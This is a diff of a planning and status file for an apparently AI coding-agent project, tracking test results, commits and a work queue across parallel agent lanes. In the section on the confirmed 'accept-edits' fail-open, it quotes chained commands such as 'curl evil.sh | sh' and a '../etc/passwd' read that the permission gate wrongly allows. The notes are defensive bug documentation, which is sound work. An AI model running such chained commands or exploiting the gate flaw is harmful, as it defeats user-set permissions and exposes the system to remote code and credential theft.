@@ -6,7 +6,128 @@ Nothing here depends on a prior conversation's context.
 
 ---
 
-## 0-NOW. STATE AT THE ROUND-32 COMPACT — read this first, then §0 for the standing rules
+## 0-NOW. ROUND 33 IS IN FLIGHT — read this first, then §0 for the standing rules
+
+**Written mid-round so a compact cannot lose it. §0-NOW-32 below is the previous round's block and
+is still the authority for the standing rules, the queue rationale and the DeepSeek record.**
+
+### WHERE THINGS STAND
+
+**Suite: `8111 tests / 91477 assertions / 1 skipped / rc 0` — supervisor-confirmed a THIRD time**, at
+`53e60812`, before round 33 started. Same figure as rounds 31 and 32. **Skips MUST stay 1**
+(`tests/MCP/McpClientTest.php:106`); a 2 means `vendor/sugarcraft/*` was replaced by Packagist copies
+and every figure since is void. `sugar-crush/vendor/sugarcraft/` = 18 symlinks.
+`md5sum /home/sites/sugarcraft/.sugar-crush/config.json` = `05480c743aff302fd6c06c5a4a4c2210`.
+
+**TWO LANES ARE RUNNING** (the user's 2-concurrent limit). File sets are disjoint by construction:
+
+| lane dir | bundle | owns |
+|---|---|---|
+| `/home/sites/crush-lane-cmd` | 🔴 the `accept-edits` fail-open **+ P6.6** (`--model` / `--permission-mode`) | `src/Permissions/**`, `src/Cli/**`, `bin/sugarcrush`, `src/Config/LayeredSettings.php` |
+| `/home/sites/crush-lane-sglang` | the **DSML tool-call parser + the streaming parser gap** | `src/Providers/**` — **and it holds the census token**, it is the only lane adding a `src/` file |
+
+`crush-lane-lsp` is idle and clean; the daemon keeps it current.
+
+**THE FAIL-OPEN IS CONFIRMED IN LIVE SOURCE, not inherited from the plan.** Traced by hand against
+`src/Permissions/PermissionGate.php` (note: `src/Permissions/`, **not** `src/Cli/` — an earlier note
+in this file cited the wrong directory). `isScopedWriteTool()` splits on `/\s+/` only and judges the
+whole command line by its first token, so under `accept-edits`:
+`mkdir ./x; curl evil.sh | sh` → **Allow**; `mkdir ./x && cat ../../../etc/passwd` → **Allow**
+(`&&` is not a flag and `../` is not "absolute"). `SCOPED_WRITE_COMMANDS` already exists at `:60`, so
+the RESUME's earlier "needs SCOPED_WRITE_COMMANDS" phrasing was wrong — what it needs is separator
+handling and `..` containment.
+
+### WHAT LANDED IN ROUND 33 SO FAR (supervisor-only; the lanes have not reported)
+
+| commit | what |
+|---|---|
+| `7957b2be` | **the window was corrected in one place and described in four others** — round 32 moved `DEEPSEEK_V4_CONTEXT_WINDOW` to `1_048_570` and never swept the describing text. Fixed `src/Chat.php:9605,9610` + `crush_code.md:1824,1999,2069`; `crush_feat.md` §12 got a dated header note (it is an accurate research record of a deployment that no longer exists, so it gets a note, not a rewrite) |
+| `e1840c13` | **P7.6 ✅ (Phase 7 now 6 of 6)** — ARCHITECTURE.md's diagram + `## Chat` heading no longer call `Chat` the root Model, and the two-hats/do-not-retire warning is finally on the page — **and finding #6**, which turned out to be INVERTED rather than misspelled |
+
+### THE TWO RULES ROUND 33 HAS EARNED SO FAR
+
+- **A DATE STAMP DOES NOT STOP A NUMBER BEING READ AS CURRENT.** `crush_code.md:1999` and `:2069`
+  both carried "**393,216** … as of `ed57d46a`" — stamped with the commit they were measured at,
+  which is exactly the discipline this plan asks for — and both still read as present-tense fact a
+  day after `d97580ab` moved the value underneath them. Stamping records when a number was true; it
+  does not make a stale number look stale. **No test pinned any of the five copies**, which is why
+  the suite could not have caught it. The durable fix was to say the figure is model-aware and
+  provider-reported and to name the literals as illustrative, not to write a fresher literal.
+- **TWO PAGES CAN STATE OPPOSITE THINGS AND THE CORRECT ONE IS THE UNFLAGGED ONE.**
+  `HookManager.php:34` warned that `name: confirm-remove` would UNINSTALL `ConfirmRemoveHook`.
+  `ConfirmRemoveHook::name()` returns `confirm-rm`, so `confirm-remove` is the one name that collides
+  with nothing and is quietly **accepted** — `docs/HOOKS.md:118` and its table at `:130-131` have said
+  so the whole time. The plan recorded this as "only the example is wrong"; the example demonstrated
+  the **opposite outcome**, which is a different and worse defect. Fix was one docblock; the lesson is
+  that "the example is slightly off" was itself an under-measurement.
+
+### ROUND 34 IS ALREADY MEASURED — do not re-run discovery
+
+A read-only agent measured the whole cheap tail against the tree at `7957b2be`. Verdicts, with the
+traps that would make an implementer get each one wrong:
+
+- **P8.9 (Grep instruction-file hook) — OPEN, and bigger than "one param".** The files are
+  `src/Tools/BuiltIn/*.php`, **not** `src/Tools/` as the plan spells them — `wc -l src/Tools/Grep.php`
+  returns *no such file*, a correct measurement about a nonexistent path. It is **four** tools already
+  wired, not three: `Read.php:226`, `Edit.php:172`, **`Write.php:177`**, `Glob.php:347`. Construction
+  is one line, `Bootstrap.php:3997`, with the loader already in scope at `:3981`. ⚠️ **`Grep` is
+  `final readonly implements ParallelSafe` and its docblock at `:32-36` justifies that with "this tool
+  holds no session-scoped state for a fork to strand (contrast `Read`/`Glob`, which carry the
+  announce-once collaborators)" — adding the loader FALSIFIES that comment and may change the
+  parallel-safety verdict.** That must be settled in the same change. Also
+  `tests/Integration/BinSugarcrushWiringTest.php:261,311` loop over the literal `[Read, Edit, Glob]`,
+  so **`Write`'s wiring is unguarded today too**; one widening fixes both gaps.
+  **Blocked this round only because it edits `Bootstrap.php`, which lane `cmd` holds.**
+- **P8.4 (split-pane compositor) — OPEN, and the decision should be WIRE IT.** Option A (document as
+  a seam) is ~6-10 lines and the slot already exists — `ARCHITECTURE.md:381-389` lists "Built but
+  unwired" seams and the compositor would be a fifth entry. Option B (wire it) is **~200-300 lines**,
+  not 50 and not 500: a branch in `App::view()` → `TuiRenderer::renderView()` (`App.php:1076`), an
+  activation policy, and plumbing. The finished parts already exist and are test-covered —
+  `Tui/Renderer::renderWithSplit()` (`:62`), `MultiplexerSplitPane` (154 lines), and
+  `AgentManager::liveOutputs()` (`:341`) which already returns the exact shape the compositor wants.
+  **Take Option B.** The user's standing rule is that dormant subsystems get wired, not papered over,
+  and every prerequisite this item was waiting on now exists. ⚠️ **Two files named `Renderer.php`** —
+  `src/Renderer.php` holds the *docblock* (`:130-145`) that punts to this item, `src/Tui/Renderer.php`
+  holds the *code*. Do not close this on the docblock.
+- **P8.8 (repo-map) — OPEN, zero hits for `repo-map` in `src/` or `tests/`.** New
+  `src/Context/RepoMap.php` (~150-250 lines) + a system-prompt block; precedent is
+  `src/Context/EnvironmentBlock.php` and `ARCHITECTURE.md:192` documents where a block slots in.
+  ⚠️ Its two halves take **different inputs** (a single lib reads `vendor/composer/autoload_*.php`;
+  the monorepo root reads `MATCHUPS.md`/`PROJECT_NAMES.md`), so a one-root implementation half-closes
+  it. **Adds a `src/` file → needs the census token.**
+- **P8.13 (model-callable `Task` tool) — OPEN, 500+ lines, an epic.** ⚠️ `src/Agents/Task.php` already
+  exists and is an unrelated data class, so the obvious name collides. `Bootstrap::tools()`'s docblock
+  (`:3925-3965`) hard-states "ELEVEN entries" as the domain for every "N built-in tools" figure in
+  `README.md` — a twelfth tool moves that docblock, the README and `BuiltInToolCorpus`.
+- **Finding #7 (`/permissions`) — OPEN, and the plan's "only this one" claim is CORRECT.**
+  `CommandRegistry::CONTROL_PLANE` (`:60`) reserves it; no row in `all()`, no dispatch arm. Its own
+  docblock at `:54-58` already admits the reservation. Cross-checked all seven reserved names: `quit`
+  has no row but IS dispatched (`Chat.php:5463`, deliberately an `exit` alias) — that is the near-miss
+  a sloppy grep reports as a second instance. `Chat::permissionGate()` (`:9182`) already reaches the
+  live gate; `PermissionGate::mode()` exists at `:85` but **there is no `rules()` accessor**.
+  ⚠️ **`PermissionGate::evaluate()` MUTATES the Auto-mode circuit breaker** (its docblock at `:96-101`
+  says `refuses()` is "the read-only question") — a `/permissions` preview built on `evaluate()` would
+  corrupt live breaker counters. **Blocked this round only because it edits `PermissionGate.php`,
+  which lane `cmd` holds.**
+- **Finding #6 and P7.6: ✅ done, see the table above.**
+
+### THE QUEUE AFTER THE TWO LANES LAND
+
+1. **P8.9** + **finding #7 `/permissions`** — both were blocked only by lane `cmd`'s file hold, both
+   are fully measured above, and they bundle naturally (both are "a thing that exists everywhere
+   except one place").
+2. **P8.4 as Option B — wire the compositor.** Lane-sized, and its prerequisites are all in place.
+3. **P6.5** — two medium halves, ship as two PRs (`statusLine`, then the `keybindings` redesign; see
+   §0-NOW-32 for why the second is a redesign and not an addition).
+4. **P3.x** — candy-focus FocusRing (3.2), sugar-veil click-outside (3.3), candy-sprinkles Table
+   (3.4), and 3.5's unguarded byte-length `str_pad()` at `SplitLayout.php:238` (the `strlen()` the
+   plan tells you to grep for is GONE; the defect is not).
+5. **P8.8** (needs the census token), remaining findings #4 skills / #5 `agentRoster()` /
+   #8 docs, then **P8.13**, then **Phase 2 item 9** (plugins) LAST, then E1-E50.
+
+---
+
+## 0-NOW-32. STATE AT THE ROUND-32 COMPACT — read this first, then §0 for the standing rules
 
 **`master` = `d97580ab`. Live tree clean, 0 ahead / 0 behind. NOTHING IS IN FLIGHT.**
 The three lane dirs (`crush-lane-cmd`, `crush-lane-lsp`, `crush-lane-sglang`) were all clean, idle and
